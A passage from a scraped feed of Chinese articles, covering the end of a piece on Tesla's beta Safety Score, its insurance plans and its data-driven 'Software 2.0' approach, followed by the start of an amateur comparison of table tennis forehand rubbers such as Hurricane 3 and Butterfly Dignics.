车上。</strong></p>\n<p>在这片技术的无人区中，包括美国在内的全球各地监管机构，对自动驾驶技术多是抱以支持和鼓励发展的宽松监管态度，却并没有就自动驾驶系统如何有序、安全、可控地扩展到每一辆车上给出详细的管理办法。 </p>\n<p>这是技术跑在监管前的窘境，首批 2000 名公测车主易选（实际上也不是那么容易），20000 名呢？200000 名呢？<strong>今天，特斯拉在全球的保有量已经超过了 2000000 辆。这是一个非常棘手的问题。</strong> 于是特斯拉基于 60 亿英里的车队数据得出的统计模型做出了安全评分 Beta。 </p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/article/cacbc8a153bfcbc5c7117bcd335c8de7\" alt=\"图片\"></figure><p>然后特斯拉的 Autopilot、座舱和 App 团队协作，面向美国的 FSD 车主同时推送 Tesla OS v2021.32.22 和特斯拉 App v4.1 版本更新。不过，和特斯拉的第一版智能召唤 Beta、第一版自动辅助导航驾驶（NoA）Beta 甚至第一版 FSD Beta 一样，<strong>第一版的安全评分体验之差，开发之 Beta 超出了不少车主的预期。</strong></p>\n<p>例如，知名特斯拉博主 @TeslaJoy 和 @Scott Wainner 都表示，驾驶员并没有违反上述 5 个指标，仅仅是基于 Autopilot 或 NoA 驾驶了一段行程，就会被「安全评分」判定为存在「急刹车」、「猛转向」或「不安全跟车」行为，将分数扣掉。两位博主暴露的问题在于，<strong>由于版本过于 Beta，特斯拉开发的自动驾驶算法甚至不能通过特斯拉「安全评分」的考验。</strong></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/article/80e84f4fea9085830510b156389d4456\" alt=\"图片\"></figure><p>由于安全评分的标准过于苛刻，大量车主选择谨慎驾驶以避免被扣分。外媒 Electrek 甚至给出了这样的标题：到处都是慢吞吞的特斯拉（Slow Teslas everywhere）。 </p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/article/73b928e8db6d7bdeedf90cf0cfe9ac78\" alt=\"图片\"></figure><p>知名赛道爱好者、<strong>Model S Plaid 车主 Dragtimes 在零接管的情况下被打出了 5 分的低分。</strong></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/article/e130f1a90ae2a6ce60835eee86de9858\" alt=\"图片\"></figure><p>另一位特斯拉车主、通用旗下自动驾驶公司 Cruise 产品副总裁 Oliver Cameron 表示，<strong>如果一个致力于实现从 A 到 B 的自动驾驶产品，运行时给你的压力要比你自己开车压力还大，那 Ta 可能不是个好产品。</strong></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/article/752d956bbe12144ff4037f5edf29e36b\" alt=\"图片\"></figure><h2><strong>「安全评分」的想象力</strong></h2>\n<p>「安全评分」的想象力不止于此。「安全评分」的本质，在于通过对驾驶员驾驶行为尽可能细颗粒度的拆解与统计，有效地预测车辆在未来的事故率。驾驶数据越丰富、驾驶场景越细致、「安全评分」的预测准确性就越高。Elon 曾经说过，<strong>与传统汽车保险公司竞争的核心在于信息的准确性。</strong>得益于特斯拉全球第一大智能电动汽车制造商的地位，特斯拉坐拥业内最丰富也最详细的车队数据。从业务角度看，特斯拉对汽车保险公司的打击是降维的。</p>\n<p>特斯拉进入汽车保险领域，<strong>这是比有序扩张 FSD 内测规模重要得多的新业务，这也是为什么，运行「安全评分」的主体名叫特斯拉保险计算器。</strong></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/article/68934a9511335c92bd2392e914f30960\" alt=\"图片\"></figure><p>此外，特斯拉保险的全面推开还会有反向教育驾驶员，从而进一步降低事故率的潜力。Elon 认为，人们会为了更低的保费学习更谨慎的驾驶车辆。<strong>「这就像……如果你想为保险支付更多费用，你可以（高风险驾驶），但如果你想少付费，那请不要那么疯狂。人们会做出选择」。</strong></p>\n<p>当然，这一切的前提是特斯拉做得足够好，以当前铺天盖地的针对「安全评分」的吐槽来看，现有的汽车保险公司不仅没有感到压力，甚至差点笑出了声。 </p>\n<p>但特斯拉一点不慌。不仅不慌，特斯拉很可能在推送前就预知了这样的反馈。 因为特斯拉除了在博客中提到<strong>「随着我们获得更多的用户和数据洞察，我们希望在未来对公式进行迭代」</strong>，在上线当天，Elon 也特别提到目前还是一个非常 Beta 的版本，「安全评分」将随着时间的推移而进化，以更准确地预测事故率。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/article/41ce647b721fcf591570b41d9f879f85\" alt=\"图片\"></figure><p><br>事实上，特斯拉对「安全评分」的布局甚至早于 FSD Beta 公测。在 2020 年 7 月 22 日的特斯拉 Q2 财报会议上，Elon 公开招聘「革命性精算师」： </p>\n<blockquote><p>我特别欣赏一些精力充沛的精算师，我非常尊重精算师这个职业。你们的数学很好，请加入特斯拉，特别是如果你对保险行业的缓慢节奏感到恼火并想做出改变，这儿就是你要去的地方，我们需要革命性的精算师。</p></blockquote>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/article/b748cd3a7bb7607a1a7220e4026758aa\" alt=\"图片\"></figure><p>Elon 没开玩笑。今天，特斯拉建立起了一支精算师团队，Title 真的就叫革命性精算师（Revolutionary Actuary）。在特斯拉「革命性精算师」的职位描述中，有两条要求让人印象深刻，<strong>一是和「数据科学家」协作，二是熟练掌握Python，拥有开源机器学习库和框架，例如 Scikit-learn、PyTorch 和 Tensorflow 的应用经验。</strong></p>\n<p>特斯拉「数据科学家」隶属于车队分析（Fleet Analytics）团队，特斯拉称这是一支规模虽小但发展迅速的中央团队，赋能其他业务团队以改进产品，使特斯拉车主更安全。</p>\n<p>特斯拉要求「数据科学家」要具有强大的机器学习和软件工程基础，<strong>拥有多种机器学习模型的开发经验，基于开源技术处理 PB（Petabyte，千万亿字节）级的时间序列数据。</strong>特斯拉在中国也放出了「数据科学家」的职位，但对于特斯拉中国而言，相比算法，更重要的也许是先解决「数据原料」的问题。 </p>\n<p>Elon 在 2021 年世界互联网大会乌镇峰会上表态，特斯拉已经在中国建立了数据中心，用来存储中国业务产生的所有数据。<strong>包含生产数据、销售数据、服务数据和充电数据，所有个人身份信息都安全的存储在中国国内，不会转移到海外。</strong></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/article/6009d73bf189062d2a192d51dc7da7fa\" alt=\"图片\"></figure><p>在展台背景板上，特斯拉更详细地向中国政府和消费者解释了「如何处理客户个人信息和车辆数据」：</p>\n<ul>\n<li>收集：合法合规、最小必要、公开透明原则</li>\n<li>存储：完全存储在中国境内，通过数据加密、鉴权、访问控制等技术确保存储安全</li>\n<li>传输：通过数据加密，专用证书体系确保传输过程安全</li>\n<li>删除：用户有权撤销自己的数据及数据使用授权</li>\n<li>跨境：个人身份信息不出境。需要出境的重要数据均经主管部门批准后进行</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/article/20c819bec4603cf893285a83e7337d82\" alt=\"图片\"></figure><p><strong>随着车队规模的持续增长，数据驱动开始越来越多的植入特斯拉的产品与工程。</strong></p>\n<p>2016 年 10 月，特斯拉开始基于车队数据，用机器学习算法驱动 Autopilot 辅助驾驶系统，逐步提高越来越多的场景下的驾驶自动化率。</p>\n<p>2019 年 10 月，特斯拉基于车队数据中的 100 万张照片，训练出了机器学习算法 Deep Rain 神经网络，用以识别不同强度的雨量工况并匹配自动雨刮频率。 </p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/article/9bd5ff4a725bc3a2cb3da1a112d2f130\" alt=\"图片\"></figure><p><br>2020 年 5 月，特斯拉基于储能电池 Powerwall、Powerpacks 和 Megapacks 的集群数据，推出了机器学习能源交易平台 Autobidder 和机器学习能源优化引擎 Opticaster，<strong>到 2021 年 5 月，Autobidder 平台上管理着超过 1.2 GWh 的电池资产，Opticaster 积累了超 1 亿小时的运营经验，为全球数千名特斯拉客户提供了数千万美元的价值。</strong> </p>\n<p>2021 年 9 月，特斯拉基于 60 亿英里的车队数据推出了驾驶安全性评估软件「安全评分」，根据 Elon 的说法，在特斯拉保险之前，「安全评分」将首先评估和指引 FSD Beta 公测规模的扩张，从下周起，FSD Beta 公测车队将以 1000 辆/天的速度快速扩张。</p>\n<p>2021 年 9 月，Elon 接受特斯拉车主的提议，决定基于车队数据训练一个新的深度神经网络，<strong>用以自动化控制各种工况下的特斯拉汽车空调，例如在堵车、山火烟雾、土路和暴雨时启动空气循环。</strong></p>\n<p> 在过去，无论是辅助驾驶、自动雨刮还是能源交易＆场景优化、汽车保险软件，无一例外是「由软件工程师手动编写规则」（软件 1.0）运行，在特斯拉，<strong>「数据驱动的机器学习」（软件 2.0）正在变得无孔不入。</strong> </p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/article/35ce251d28756845eebbc6148f9e5259\" alt=\"图片\"></figure><p>通过定义所需行为的数据集和深度神经网络架构和不同的权重，特斯拉相信第一版奇差无比的机器学习性能会变得更强，最终全面超越人类工程师编写的规则。 </p>\n<blockquote><p>越来越多的软件 1.0 被软件 2.0 取代，软件 1.0 吞噬世界，软件 2.0 吞噬软件 1.0。<strong>从长远来看，这种范式的前景是光明的，因为越来越清晰的是，当我们开发通用人工智能的时候，Ta 肯定会基于软件 2.0。</strong></p></blockquote>\n<p>这是一种全新的研发哲学，特斯拉高级 AI 总监 Andrej Karpathy 于 2017 年在一篇博客中提出，博客的标题就叫《软件 2.0》。</p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\">正版软件</a>，少数派为你呈现 🚀</p>\n","link":"https://sspai.com/post/69067"},{"title":"真正懂乒乓球的人，都买了什么样的乒乓球和乒乓球拍？","date":"2021-10-08 03:11:28","description":"\n<p>算不上什么真正懂乒乓球的人，回答这个问题未免有些僭越。权当是抛砖引玉了。</p>\n<h2>前言</h2>\n<p>乒乓球拍是由底板和套胶组合而成的。在不以玩器材或收藏为目的的前提下，底板的开销远远小于套胶——底板可以保持性能稳定数年、十数年乃至数十年，中高档的底板价格在几百到小千元不等；而套胶的寿命通常最多只有一两年，价位却常常破百，中高档在中百元左右。</p>\n<p>在使用的过程中，尤其是业余爱好者的使用过程中，套胶的不同所产生的体验的不同，亦通常大于底板不同所造成的差异。因为力量一定是先作用于套胶，而后才是底板，而业余爱好者常常无法将力量高效传导进底板中。因此，业余玩家击球的体验主要与套胶有关。这正是笔者想探究的——究竟哪一款套胶能给玩家以最好的<b>正手</b>使用体验呢？国内最流行、口碑最好的，自然是红双喜出品的狂飙3系列。那么，除了它，是否还会有一样好，甚至更好的选择呢？</p>\n<p>我们不妨来做个实验探究一下。实验的主题就是：“<b><i>什么是世界上最好的正手套胶？除了狂飙3，是否还有其他的替代品？</i></b>”</p>\n<hr>\n<h2>引子</h2>\n<p>红双喜狂飙3的前身问世之初，尚是小球时代。它以其精准的控制能力，出色的粘性摩擦，在近台有着优秀全面的表现，完美契合了中式灵巧、抢先上手的打法。随着时间的推移、器材的更迭，传统打法渐渐退下历史的舞台。但国人的智慧是无穷的，紧跟时代改进技术动作，形成了全身充分发力、打磨结合的正手体系；与此同时，它的配方也在不断从胶面、海绵等多个维度进行调整——在40mm赛璐珞时代确定了狂飙、天极系列，狂飙3成为明星产品，并继续改进以适应无机胶水、40mm+新材料球等器材规则的变化。</p>\n<p>正是由于国人的不懈努力，狂飙3长盛不衰，与之配套的技术动作也始终在先进程度上屹立世界之巅。狂飙3称得上是国民正手套胶，既在王谢堂前，又在百姓家中。不论是科班小选手，教练配置的第一支练习拍；抑或是信息不甚发达之时，业余爱好者们购买的第一支成品拍，狂飙3在绝大多数情况下都是他们的启蒙。它的性能也配得上大家的喜爱。</p>\n<p>然而狂飙3虽好，也有其局限性。它的海绵韧性很足，在提供了充足的发力空间的同时，也对使用者的发力有较高的要求，部分业余爱好者使用它会感到劳累，无法稳定发挥出它的性能。除此之外，它的最佳状态比较依赖出厂后增能剂的使用，以降低海绵的硬度并微调其结构。有机时代使用的是有机胶水，无机时代使用的是各类增能油。如果特别追求狂飙3的性能，可能每过两三个月就要将套胶撕下、除胶、重新灌油、再次贴上。这对于多数业余爱好者来说显得过于繁琐。因此，尽管狂飙3非常棒，大家仍在不断寻找更易打理、性能同样优秀的其他套胶，尝试替换掉狂飙3。</p>\n<p>作为非中式硬质套胶领域的王者，蝴蝶旗下的顶级套胶自然是众人眼光的焦点。从有机时代的Bryce系列，到无机时代的Tenergy系列，蝴蝶一直引领风骚，在手感的细腻与性能的均衡方面，没有其他外国套胶品牌可以与之完全平等地竞争。40mm+新材料球之前，蝴蝶Tenergy系列只有传统的05、80、64、25系列，以及其fx海绵软版。由于正手发力充分、上限高，通常人们只会考虑原版而非fx版。</p>\n<p>Tenergy 25绝对杀伤力足够高，但胶粒太大弧线太低，容错率不佳，有一点正胶的味道，比赛时愿意选择的选手不多，是一个小众的系列；通常我们只横向比较05、80、64系列。三者都是优秀的套胶，各个方面都不差，但05最偏向旋转，64最偏向速度。对于从狂飙3尝试转型的爱好者，Tenergy 05会是最符合手感及发力要求的选项，但海绵仍然较狂飙明显偏软。在注重瞬间发力的一些打外国套胶的技巧后，出球质量虽然可圈可点，但总是手感反馈有些空落落的，似乎少了点狂飙3的爽感。</p>\n<p>至于同时代蝴蝶推出的粘性套胶Spin Art，就更是难当大任了。虽然台内控制稳定，有了粘性套胶该有的基本味道，但发力后力量衰减得很快，比狂飙3和Tenergy 05都要逊色。再加上蝴蝶公司并不重视这款套胶的宣传，国内几乎没什么反响，口碑更是无从说起。笔者曾在部分论坛看过玩家对其的好评，但他们也承认这款套胶并不是一块包容的胶皮，只适合搭配部分底板使用<sup data-draft-node=\"inline\" data-draft-type=\"reference\" data-numero=\"1\" data-text=\"该玩家认为Spin Art适合搭配纯木底板\" data-url=\"http://www.grupoemesa.com/forum.php?mod=viewthread&amp;action=printable&amp;tid=444894\">[1]</sup>。</p>\n<p>如此这般，大多数中国玩家的心逐渐沉寂下来，暂时不去幻想真正可以与狂飙3媲美的套胶。</p>\n<p>直到40mm+新材料球问世后，由于球的特性改变，对选手的击球威力的要求更高了。蝴蝶于18年底开始接连推出了Tenergy 05 Hard（加硬海绵版，与fx版正好相反）、Dignics系列（05、80、64，海绵相对Tenergy进行了针对新球的升级，25未出，fx未出），以及粘性版本的Dignics 09c。大家的心思又再一次被撩拨了。</p>\n<hr>\n<h2>太长不看点这里</h2>\n<h3>蓝国 vs D09c vs T05H vs D05</h3>\n<div class=\"highlight\"><pre><code class=\"language-text\"><span></span>// 一个快速入口，无具体内容\n</code></pre></div>\n<hr>\n<h2>准备工作</h2>\n<h3>选品</h3>\n<p>因此，笔者从蝴蝶近年的新品中选取了最适合用于正手的三款套胶——Dignics 09c（下文简称<b>D09c</b>）、Dignics 05（<b>D05</b>）以及Tenergy 05 Hard（<b>T05H</b>），再加上狂飙3的市场版顶配——蓝海绵国级（<b>蓝国</b>，39度2.15mm，刷海夫黑油），进行一个横向测评（蝴蝶套胶均为最大厚度），看看新时代是否仍是狂飙3独领风骚。</p>\n<h3>上手</h3>\n<ul><li>\n<b>蓝国</b>｜标价700元（入手任何器材前请做好功课，领会标价的含义）</li></ul>\n<p><img src=\"https://pic1.zhimg.com/v2-2b5caaf73c0a30aa9a910877b8f1bdee_720w.gif?rss\" data-rawwidth=\"600\" data-rawheight=\"338\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-2b5caaf73c0a30aa9a910877b8f1bdee\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>高级的狂飙3为了适应新球的竞技特性，胶面已经调整为半粘半涩的配方，以增加出球的速度。但这个闪亮的盖胶层依旧亮眼。</p>\n<ul><li>\n<b>D09c</b>｜标价668元</li></ul>\n<p><img src=\"https://pic3.zhimg.com/v2-d308c31d2ff4fbe7ae95a04bf5ee6113_720w.gif?rss\" data-rawwidth=\"600\" data-rawheight=\"338\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-d308c31d2ff4fbe7ae95a04bf5ee6113\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>蝴蝶的最新粘性套胶，没有狂飙3的盖胶配方，但同样是一种半粘半涩的感觉。两家大厂对于新球时代器材的理解似乎有不少共识。Dignics独特的橙红色海绵令人醉心。</p>\n<ul><li>\n<b>T05H</b>｜标价628元</li></ul>\n<p><img src=\"https://pic3.zhimg.com/v2-98e0f6be6ca2458cc0975279fafa604a_720w.gif?rss\" data-rawwidth=\"600\" data-rawheight=\"338\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-98e0f6be6ca2458cc0975279fafa604a\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>加硬后的Tenergy海绵仍是传统橘黄色。手捏的触感上明显要比蓝国灌油后硬一些，跟D09c差不多。当然，具体仍以上台实际感受为准。</p>\n<ul><li>\n<b>D05</b>｜标价668元</li></ul>\n<p><img src=\"https://pic3.zhimg.com/v2-f59407d99def996fe7f835494299d204_720w.gif?rss\" data-rawwidth=\"600\" data-rawheight=\"338\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-f59407d99def996fe7f835494299d204\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>尽管韧性相比Tenergy常规海绵有所加强，它仍是四款中海绵触感最软的一款。值得注意的是它惊艳的胶面摩擦力。虽然蝴蝶声称05的胶面都相同，但笔者坚定认为D的胶面相比T是经过优化的——</p>\n<p><img src=\"https://pic4.zhimg.com/v2-2070d7a8813e159f5627a44cfc25aa90_720w.gif?rss\" data-rawwidth=\"600\" data-rawheight=\"338\" data-size=\"normal\" data-caption=\"Tenergy 05 Hard 表面摩擦体验\" data-watermark=\"watermark\" data-original-src=\"v2-2070d7a8813e159f5627a44cfc25aa90\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>如图，同样将手指以最小力放置在胶面上进行左右摩擦，我们可以看到手指虽能感知阻力，但仍能在T05H上滑动。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-2700fd300598786331377d4f73914e03_720w.gif?rss\" data-rawwidth=\"600\" data-rawheight=\"338\" data-size=\"normal\" data-caption=\"Dignics 05 表面摩擦体验\" data-watermark=\"watermark\" data-original-src=\"v2-2700fd300598786331377d4f73914e03\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>但在D05上几乎没有滑动，静止的摩擦力甚至可以将持拍手带动。感兴趣的各位读者也可以试一试，验证一下笔者的观点。</p>\n<p><b>所有官方数据仅供参考。因为蝴蝶的套胶与狂飙3的弹性原理不同，硬度等数据并不能直接与狂飙3进行对比以推断自身对其的驾驭能力，一切应以个人感受为准。本文的目的也是从业余评测者的角度出发，多贡献几个数据点，以供爱好者们参考。</b></p>\n<hr>\n<h2>试打实验</h2>\n<h3>实验设计</h3>\n<p>笔者分别将四款套胶贴在两块性能顶级，且正反手均衡的底板上，如此便可通过倒板高效地进行各项正手测试。虽然底板的特性会影响出球的性质，但通过同一款底板的倒板，便可大体感知出套胶之间的专属差异；除此之外，底板的影响主要体现在大力量的技术环节，中小力量下主要发挥的还是套胶的性能。因此，在成本及效率的权衡下，笔者认为测评的实验设计总体上是合理的。</p>\n<p>测评人员为笔者以及另两位球友，共三人。无纯专业选手，但三位均受过部分科班体系的训练，练球过程中能合理感知器材的性能。三人水平大致是高校业余组校队上游、普通社会球馆平均水平，积分1500-1700不等（视地区不同额外浮动），校准参考约为深圳业余赛乙B到乙A水平。因此，我们认为该文的观点对于多数业余球友是有参考价值的。</p>\n<p>三位的打法分别为直板前三板打法、横板正手弧圈反手快攻打法，以及横板中台控制型打法。各位打法不一，对器材的要求也不同，可以从多个角度对套胶的不同特性进行评测。三人将在试打后进行投票，并针对每一项技术指标对四款套胶进行排序，分别为：</p>\n<p><img src=\"https://pic3.zhimg.com/v2-5128b6dd185649f3196ea300bd65ee07_720w.jpg?rss\" data-rawwidth=\"896\" data-rawheight=\"738\" data-size=\"normal\" data-caption=\"进行测评的技术点，发球由笔者另测\" data-watermark=\"watermark\" data-original-src=\"v2-5128b6dd185649f3196ea300bd65ee07\" data-watermark-src=\"v2-5ebb0b92ceda5f1a5195d7b690211fdf\" data-private-watermark-src=\"v2-584674fab40f30833edf6e25b85fdd0d\"></p>\n<p>排序数据将用于结果部分的分析。由于球友的时间安排紧张，加上笔者发球相对特长，将在之后单独进行发球的测试，并找其他球友进行打分，凑足三人。在试打完成后，笔者还将对自己进行盲测，以尽可能保证测评的客观，避免主观脑放带来的偏颇。</p>\n<h3>实验过程（文字描述为笔者视角）</h3>\n<ul><li>摆短</li></ul>\n<p><img src=\"https://pic1.zhimg.com/v2-4d9fcc3ae921051e81147408a7f71abf_720w.gif?rss\" data-rawwidth=\"600\" data-rawheight=\"338\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-4d9fcc3ae921051e81147408a7f71abf\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>摆短称得上是国狂的看家本领，毫无争议的第一。其他几款蝴蝶套胶在小力量摆短时均需要让一下劲才能控得够低够短，要么就得额外加摩擦，否则容易出现下图的情形：</p>\n<p><img src=\"https://pic3.zhimg.com/v2-3bbdbebba9bf3c91f28ddc07bdb1a5c4_720w.gif?rss\" data-rawwidth=\"600\" data-rawheight=\"338\" data-size=\"normal\" data-caption=\"摆短失败\" data-watermark=\"watermark\" data-original-src=\"v2-3bbdbebba9bf3c91f28ddc07bdb1a5c4\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>相对来说，D09c的借力摆短在蝴蝶里面是最好的，粘性对控制还是很有帮助。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-0e389896e0714d9569fce91f2d5c983f_720w.gif?rss\" data-rawwidth=\"600\" data-rawheight=\"338\" data-size=\"normal\" data-caption=\"慢摆短\" data-watermark=\"watermark\" data-original-src=\"v2-0e389896e0714d9569fce91f2d5c983f\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>蓝国的卸力能力很好，业余若笔者也能顺利地进行慢摆短（下降期摆短）等高级技术。虽然笔者手感在业余中也算细腻，但蓝国功不可没。</p>\n<ul><li>劈长</li></ul>\n<p><img src=\"https://pic3.zhimg.com/v2-5c13dbe2b72c56b442e63351c80289fe_720w.gif?rss\" data-rawwidth=\"600\" data-rawheight=\"338\" data-size=\"normal\" data-caption=\"D05加转劈长质量非常高\" data-watermark=\"watermark\" data-original-src=\"v2-5c13dbe2b72c56b442e63351c80289fe\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>开始进入主动发力的领域。蓝国表现依旧稳定，D05在笔者看来表现亮眼，主动摩擦后劈得很转，大概率归功于其稍有不同的05胶面，摩擦力基本与D09c持平了。</p>\n<ul><li>攻球</li></ul>\n<p><img src=\"https://pic1.zhimg.com/v2-aa820bc86c6f98cf8cb24c876b9cb46e_720w.gif?rss\" data-rawwidth=\"600\" data-rawheight=\"338\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-aa820bc86c6f98cf8cb24c876b9cb46e\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>蝴蝶系列海绵的爽脆感是蓝国所不具有的。T05H的手感非常好，D09c和D05各擅胜场，而蓝国就显得有些拖沓了。</p>\n<ul><li>连续拉</li></ul>\n<p><img src=\"https://pic3.zhimg.com/v2-6193eb60df1576f8b9e1ce0ade0551e7_720w.gif?rss\" data-rawwidth=\"600\" data-rawheight=\"338\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-6193eb60df1576f8b9e1ce0ade0551e7\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>蓝国发力练球时手感梦幻，D09c也表现出很好的持球能力与速度。</p>\n<ul><li>起下旋</li></ul>\n<p><img src=\"https://pic3.zhimg.com/v2-678084a1b8f937f3439fb1a432cbd5c5_720w.gif?rss\" data-rawwidth=\"600\" data-rawheight=\"338\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-678084a1b8f937f3439fb1a432cbd5c5\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>蓝国的粘性胶面与韧性的海绵似乎天生为起下旋而生。D09c的表现也很突出，相对更需要一些打涩性套胶的爆发力，但发力结构的要求比传统T05等要低。</p>\n<ul><li>相持</li></ul>\n<p><img src=\"https://pic4.zhimg.com/v2-da7a8323fc14b8ea5bb0bafbb3a2bc63_720w.gif?rss\" data-rawwidth=\"600\" data-rawheight=\"338\" data-size=\"normal\" data-caption=\"中等力量相持片段 另一场补录\" data-watermark=\"watermark\" data-original-src=\"v2-da7a8323fc14b8ea5bb0bafbb3a2bc63\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>中等力量的相持正手下D09c的海绵自身速度有较大优势，稍粘的胶面也能对出球弧线有一定的调整。蓝国以其调节能力紧随其后，但压迫性确实比D09c略逊。</p>\n<ul><li>快带</li></ul>\n<p><img src=\"https://pic1.zhimg.com/v2-9f849fe5f6b7196ab23b303762838caa_720w.gif?rss\" data-rawwidth=\"600\" data-rawheight=\"338\" data-size=\"normal\" data-caption=\"快带手法其一，练球比较从容\" data-watermark=\"watermark\" data-original-src=\"v2-9f849fe5f6b7196ab23b303762838caa\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>快带技术各人的手法偏好不一。有人喜欢判断旋转后直接前后引拍盖过去，有人喜欢稍稍持球后做一个小小的反拉动作。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-e83391fec331a66b14881a2558204e34_720w.gif?rss\" data-rawwidth=\"600\" data-rawheight=\"338\" data-size=\"normal\" data-caption=\"快带手法其二，实战中从权处理\" data-watermark=\"watermark\" data-original-src=\"v2-e83391fec331a66b14881a2558204e34\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>不同的偏好决定了ta会更喜欢旋转较弱速度较快的T05H，还是旋转突出的蓝国/D05。</p>\n<ul><li>反拉</li></ul>\n<p><img src=\"https://pic1.zhimg.com/v2-177d2f3bad2473dd9e025a56ba35cde9_720w.gif?rss\" data-rawwidth=\"600\" data-rawheight=\"338\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-177d2f3bad2473dd9e025a56ba35cde9\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>蓝国的海绵控制能力极强，D09c紧随其后。另两款需要小臂加速收得比较多以造出高质量弧线，暂时与狂飙体系的选手风格不完全兼容了。</p>\n<ul><li>对拉</li></ul>\n<p><img src=\"https://pic2.zhimg.com/v2-6fbc28b9d53c512877153c209d5b85a3_720w.gif?rss\" data-rawwidth=\"600\" data-rawheight=\"338\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-6fbc28b9d53c512877153c209d5b85a3\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>蓝国刷油后特有的金属音太销魂了，弧线也是最贼的。大力之下D09c和T05H都发挥出了极高性能，这时的D09c一贯的高水准，而T05H也如猛兽般势不可当。D05与前三者比明显发空了，虽然性能已经算优秀。</p>\n<a href=\"https://www.zhihu.com/video/1429641996235829248\">业余对拉回合 蓝国金属音</a><p>想听金属音可以点进视频。</p>\n<ul><li>正手挡</li></ul>\n<p><img src=\"https://pic4.zhimg.com/v2-69c259151c311b6001a860d9a99f3cf0_720w.gif?rss\" data-rawwidth=\"600\" data-rawheight=\"338\" data-size=\"normal\" data-caption=\"T05H完美的防守手感，甚至感觉位置到了，随时可以反击\" data-watermark=\"watermark\" data-original-src=\"v2-69c259151c311b6001a860d9a99f3cf0\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>T05H的硬海绵加涩性胶皮的优势完全显现出来，非常干净清爽的手感，防守毫无压力。蓝国相比来说表现就显得一般，容易吃转，很多时候要吸一点。</p>\n<ul><li>发球</li></ul>\n<p><img src=\"https://pic4.zhimg.com/v2-793b84224e0f414112f6cb56a08ab22c_720w.gif?rss\" data-rawwidth=\"600\" data-rawheight=\"338\" data-size=\"normal\" data-caption=\"转不转发球（下旋短+不转短）\" data-watermark=\"watermark\" data-original-src=\"v2-793b84224e0f414112f6cb56a08ab22c\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>蓝国的持球时间最长，可以游刃有余地做出各种假动作，旋转的变化也是最多的。其次是D09c。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-7cf48d69b368de5d91708907d3da1ecd_720w.gif?rss\" data-rawwidth=\"600\" data-rawheight=\"338\" data-size=\"normal\" data-caption=\"勾手发球（上旋短+下旋短）\" data-watermark=\"watermark\" data-original-src=\"v2-7cf48d69b368de5d91708907d3da1ecd\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>正反手体系的选手都可以用蓝国发出四款套胶中最高质量的短球，以配合自己接下来的战术。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-57ff5501370480289665d45ba7afc1f9_720w.gif?rss\" data-rawwidth=\"600\" data-rawheight=\"338\" data-size=\"normal\" data-caption=\"奔球（下旋+上旋）\" data-watermark=\"watermark\" data-original-src=\"v2-57ff5501370480289665d45ba7afc1f9\" data-watermark-src=\"\" 